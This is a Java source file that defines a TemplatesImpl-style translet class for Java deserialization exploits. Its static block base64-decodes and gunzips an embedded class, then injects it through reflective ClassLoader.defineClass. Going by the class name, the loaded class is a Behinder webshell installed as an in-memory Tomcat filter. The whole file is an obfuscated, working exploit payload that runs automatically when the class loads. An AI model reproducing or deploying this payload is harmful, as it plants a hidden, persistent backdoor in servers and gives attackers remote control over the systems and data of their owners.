package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TomcatBehinderFilterTemplatesImpl extends AbstractTranslet {

    static {
        try {
            String base64 = "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";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            ((Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length)).newInstance().equals(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
